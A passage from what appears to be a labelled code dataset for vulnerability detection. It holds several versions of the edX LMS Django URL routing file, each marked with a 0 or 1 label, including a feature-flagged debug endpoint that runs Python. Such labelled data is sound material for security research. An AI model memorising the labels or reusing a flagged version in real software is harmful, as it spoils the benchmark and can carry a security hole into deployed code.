settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    ## Jasmine and admin\n    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID'):\n    urlpatterns += (\n        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),\n        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),\n        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),\n    )\n\nif settings.MITX_FEATURES.get('AUTH_USE_SHIB'):\n    urlpatterns += (\n        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),\n    )\n\nif settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):\n    urlpatterns += (\n        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_login', name='course-specific-login'),\n        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_register', name='course-specific-register'),\n\n    )\n\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):\n    urlpatterns += (\n        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),\n        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),\n        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),\n        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):\n    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),\n\nif settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):\n    urlpatterns += (\n        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),\n        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):\n    urlpatterns += (\n        url(r'^event_logs$', 'track.views.view_tracking_log'),\n        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):\n    urlpatterns += (\n        url(r'^status/', include('service_status.urls')),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):\n    urlpatterns += (\n        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),\n    )\n\nif settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):\n    urlpatterns += (\n        url(r'^edinsights_service/', include('edinsights.core.urls')),\n    )\n    import edinsights.core.registry\n\n# FoldIt views\nurlpatterns += (\n    # The path is hardcoded into their app...\n    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"),\n)\n\nif settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):\n    urlpatterns += (\n        url(r'^debug/run_python', 'debug.views.run_python'),\n    )\n\n# Crowdsourced hinting instructor manager.\nif settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',\n            'instructor.hint_manager.hint_manager', name=\"hint_manager\"),\n    )\n\nurlpatterns = patterns(*urlpatterns)\n\nif settings.DEBUG:\n    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)\n\n#Custom error pages\nhandler404 = 'static_template_view.views.render_404'\nhandler500 = 'static_template_view.views.render_500'\n/n/n/n", "label": 0}, {"id": "4e4c209ae3deb4c78bcec89c181516af8604b450", "code": "/lms/urls.py/n/nfrom django.conf import settings\nfrom django.conf.urls import patterns, include, url\nfrom django.contrib import admin\nfrom django.conf.urls.static import static\n\n# Not used, the work is done in the imported module.\nfrom . import one_time_startup      # pylint: disable=W0611\n\nimport django.contrib.auth.views\n\n# Uncomment the next two lines to enable the admin:\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    admin.autodiscover()\n\nurlpatterns = ('',  # nopep8\n    # certificate view\n\n    url(r'^update_certificate$', 'certificates.views.update_certificate'),\n    url(r'^$', 'branding.views.index', name=\"root\"),   # Main marketing page, or redirect to courseware\n    url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"),\n    url(r'^login$', 'student.views.signin_user', name=\"signin_user\"),\n    url(r'^register$', 'student.views.register_user', name=\"register_user\"),\n\n    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),\n\n    url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"),\n    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),\n    url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"),\n    url(r'^accept_name_change$', 'student.views.accept_name_change'),\n    url(r'^reject_name_change$', 'student.views.reject_name_change'),\n    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),\n    url(r'^event$', 'track.views.user_track'),\n    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?\n\n    url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"),\n\n    url(r'^login_ajax$', 'student.views.login_user', name=\"login\"),\n    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),\n    url(r'^logout$', 'student.views.logout_user', name='logout'),\n    url(r'^create_account$', 'student.views.create_account'),\n    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"),\n\n    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"),\n    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),\n\n    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),\n    ## Obsolete Django views for password resets\n    ## TODO: Replace with Mako-ized views\n    url(r'^password_change/$', django.contrib.auth.views.password_change,\n        name='auth_password_change'),\n    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,\n        name='auth_password_change_done'),\n    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',\n        'student.views.password_reset_confirm_wrapper',\n        name='auth_password_reset_confirm'),\n    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,\n        name='auth_password_reset_complete'),\n    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,\n        name='auth_password_reset_done'),\n\n    url(r'^heartbeat$', include('heartbeat.urls')),\n)\n\n# University profiles only make sense in the default edX context\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        ##\n        ## Only universities without courses should be included here.  If\n        ## courses exist, the dynamic profile rule below should win.\n        ##\n        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}),\n        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}),\n        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}),\n        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}),\n        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}),\n        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}),\n\n        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',\n            name=\"university_profile\"),\n    )\n\n#Semi-static views (these need to be rendered and have the login bar, but don't change)\nurlpatterns += (\n    url(r'^404$', 'static_template_view.views.render',\n        {'template': '404.html'}, name=\"404\"),\n)\n\n# Semi-static views only used by edX, not by themes\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        url(r'^jobs$', 'static_template_view.views.render',\n            {'template': 'jobs.html'}, name=\"jobs\"),\n        url(r'^press$', 'student.views.press', name=\"press\"),\n        url(r'^media-kit$', 'static_template_view.views.render',\n            {'template': 'media-kit.html'}, name=\"media-kit\"),\n        url(r'^faq$', 'static_template_view.views.render',\n            {'template': 'faq.html'}, name=\"faq_edx\"),\n        url(r'^help$', 'static_template_view.views.render',\n            {'template': 'help.html'}, name=\"help_edx\"),\n\n        # TODO: (bridger) The copyright has been removed until it is updated for edX\n        # url(r'^copyright$', 'static_template_view.views.render',\n        #     {'template': 'copyright.html'}, name=\"copyright\"),\n\n        #Press releases\n        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),\n\n        # Favicon\n        (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),\n\n        url(r'^submit_feedback$', 'util.views.submit_feedback'),\n\n    )\n\n# Only enable URLs for those marketing links actually enabled in the\n# settings. Disable URLs by marking them as None.\nfor key, value in settings.MKTG_URL_LINK_MAP.items():\n    # Skip disabled URLs\n    if value is None:\n        continue\n\n    # These urls are enabled separately\n    if key == \"ROOT\" or key == \"COURSES\" or key == \"FAQ\":\n        continue\n\n    # Make the assumptions that the templates are all in the same dir\n    # and that they all match the name of the key (plus extension)\n    template = \"%s.html\" % key.lower()\n\n    # To allow theme templates to inherit from default templates,\n    # prepend a standard prefix\n    if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n        template = \"theme-\" + template\n\n    # Make the assumption that the URL we want is the lowercased\n    # version of the map key\n    urlpatterns += (url(r'^%s' % key.lower(),\n                        'static_template_view.views.render',\n                        {'template': template}, name=value),)\n\n\nif settings.PERFSTATS:\n    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)\n\n# Multicourse wiki (Note: wiki urls must be above the courseware ones because of\n# the custom tab catch-all)\nif settings.WIKI_ENABLED:\n    from wiki.urls import get_pattern as wiki_pattern\n    from django_notify.urls import get_pattern as notify_pattern\n\n    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update\n    # them together.\n    urlpatterns += (\n        # First we include views from course_wiki that we use to override the default views.\n        # They come first in the urlpatterns so they get resolved first\n        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),\n        url(r'^wiki/', include(wiki_pattern())),\n        url(r'^notify/', include(notify_pattern())),\n\n        # These urls are for viewing the wiki in the context of a course. They should\n        # never be returned by a reverse() so they come after the other url patterns\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',\n            'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"),\n        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),\n    )\n\n\nif settings.COURSEWARE_ENABLED:\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',\n            'courseware.views.jump_to', name=\"jump_to\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.modx_dispatch',\n            name='modx_dispatch'),\n\n\n        # Software Licenses\n\n        # TODO: for now, this is the endpoint of an ajax replay\n        # service that retrieve and assigns license numbers for\n        # software assigned to a course. The numbers have to be loaded\n        # into the database.\n        url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.xqueue_callback',\n            name='xqueue_callback'),\n        url(r'^change_setting$', 'student.views.change_setting',\n            name='change_setting'),\n\n        # TODO: These views need to be updated before they work\n        url(r'^calculate$', 'util.views.calculate'),\n        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki\n        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),\n        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),\n\n        url(r'^courses/?$', 'branding.views.courses', name=\"courses\"),\n        url(r'^change_enrollment$',\n            'student.views.change_enrollment', name=\"change_enrollment\"),\n\n        #About the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',\n            'courseware.views.course_about', name=\"about_course\"),\n        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n        #View for mktg site\n        url(r'^mktg/(?P<course_id>.*)$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n\n\n\n        #Inside the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'courseware.views.course_info', name=\"course_root\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',\n            'courseware.views.course_info', name=\"info\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n            'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n            'staticbook.views.index', name=\"book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.index'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',\n            'staticbook.views.index_shifted'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.pdf_index'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.html_index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n            'courseware.views.index', name=\"courseware\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_chapter\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_section\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',\n            'courseware.views.index', name=\"courseware_position\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',\n            'courseware.views.progress', name=\"progress\"),\n        # Takes optional student_id for instructor use--shows profile as that student sees it.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',\n            'courseware.views.progress', name=\"student_progress\"),\n\n        # For the instructor\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',\n            'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',\n            'instructor.views.gradebook', name='gradebook'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',\n            'instructor.views.grade_summary', name='grade_summary'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',\n            'open_ended_grading.views.staff_grading', name='staff_grading'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',\n            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',\n            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),\n\n        # Open Ended problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',\n            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),\n\n        # Open Ended flagged problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',\n            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',\n            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),\n\n        # Cohorts management\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',\n            'course_groups.views.list_cohorts', name=\"cohorts\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',\n            'course_groups.views.add_cohort',\n            name=\"add_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',\n            'course_groups.views.users_in_cohort',\n            name=\"list_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',\n            'course_groups.views.add_users_to_cohort',\n            name=\"add_to_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',\n            'course_groups.views.remove_user_from_cohort',\n            name=\"remove_from_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',\n            'course_groups.views.debug_cohort_mgmt',\n            name=\"debug_cohort_mgmt\"),\n\n        # Open Ended Notifications\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',\n            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',\n            'open_ended_grading.views.peer_grading', name='peer_grading'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),\n\n    )\n\n    # allow course staff to change to student view of courseware\n    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):\n        urlpatterns += (\n            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"),\n        )\n\n    # discussion forums live within courseware, so courseware must be enabled first\n    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',\n                'courseware.views.news', name=\"news\"),\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',\n                include('django_comment_client.urls'))\n        )\n    urlpatterns += (\n        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',\n        'courseware.views.static_tab', name=\"static_tab\"),\n    )\n\n    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',\n                'courseware.views.submission_history',\n                name='submission_history'),\n        )\n\n\nif settings.ENABLE_JASMINE:\n    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)\n\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    ## Jasmine and admin\n    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID'):\n    urlpatterns += (\n        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),\n        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),\n        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),\n    )\n\nif settings.MITX_FEATURES.get('AUTH_USE_SHIB'):\n    urlpatterns += (\n        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),\n    )\n\nif settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):\n    urlpatterns += (\n        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_login', name='course-specific-login'),\n        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_register', name='course-specific-register'),\n\n    )\n\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):\n    urlpatterns += (\n        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),\n        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),\n        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),\n        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):\n    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),\n\nif settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):\n    urlpatterns += (\n        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),\n        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):\n    urlpatterns += (\n        url(r'^event_logs$', 'track.views.view_tracking_log'),\n        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):\n    urlpatterns += (\n        url(r'^status/', include('service_status.urls')),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):\n    urlpatterns += (\n        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),\n    )\n\nif settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):\n    urlpatterns += (\n        url(r'^edinsights_service/', include('edinsights.core.urls')),\n    )\n    import edinsights.core.registry\n\n# FoldIt views\nurlpatterns += (\n    # The path is hardcoded into their app...\n    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"),\n)\n\nif settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):\n    urlpatterns += (\n        url(r'^debug/run_python', 'debug.views.run_python'),\n    )\n\n# Crowdsourced hinting instructor manager.\nif settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',\n            'instructor.hint_manager.hint_manager', name=\"hint_manager\"),\n    )\n\nurlpatterns = patterns(*urlpatterns)\n\nif settings.DEBUG:\n    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)\n\n#Custom error pages\nhandler404 = 'static_template_view.views.render_404'\nhandler500 = 'static_template_view.views.render_500'\n/n/n/n", "label": 1}, {"id": "5fad9ccca43cdfb565b3f80914f998afa7f2fa78", "code": "lms/urls.py/n/nfrom django.conf import settings\nfrom django.conf.urls import patterns, include, url\nfrom django.contrib import admin\nfrom django.conf.urls.static import static\n\n# Not used, the work is done in the imported module.\nfrom . import one_time_startup      # pylint: disable=W0611\n\nimport django.contrib.auth.views\n\n# Uncomment the next two lines to enable the admin:\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    admin.autodiscover()\n\nurlpatterns = ('',  # nopep8\n    # certificate view\n\n    url(r'^update_certificate$', 'certificates.views.update_certificate'),\n    url(r'^$', 'branding.views.index', name=\"root\"),   # Main marketing page, or redirect to courseware\n    url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"),\n    url(r'^login$', 'student.views.signin_user', name=\"signin_user\"),\n    url(r'^register$', 'student.views.register_user', name=\"register_user\"),\n\n    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),\n\n    url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"),\n    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),\n    url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"),\n    url(r'^accept_name_change$', 'student.views.accept_name_change'),\n    url(r'^reject_name_change$', 'student.views.reject_name_change'),\n    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),\n    url(r'^event$', 'track.views.user_track'),\n    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?\n\n    url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"),\n\n    url(r'^login_ajax$', 'student.views.login_user', name=\"login\"),\n    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),\n    url(r'^logout$', 'student.views.logout_user', name='logout'),\n    url(r'^create_account$', 'student.views.create_account', name='create_account'),\n    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"),\n\n    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"),\n    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),\n\n    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),\n    ## Obsolete Django views for password resets\n    ## TODO: Replace with Mako-ized views\n    url(r'^password_change/$', django.contrib.auth.views.password_change,\n        name='auth_password_change'),\n    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,\n        name='auth_password_change_done'),\n    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',\n        'student.views.password_reset_confirm_wrapper',\n        name='auth_password_reset_confirm'),\n    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,\n        name='auth_password_reset_complete'),\n    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,\n        name='auth_password_reset_done'),\n\n    url(r'^heartbeat$', include('heartbeat.urls')),\n)\n\n# University profiles only make sense in the default edX context\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        ##\n        ## Only universities without courses should be included here.  If\n        ## courses exist, the dynamic profile rule below should win.\n        ##\n        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}),\n        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}),\n        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}),\n        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}),\n        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}),\n        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}),\n\n        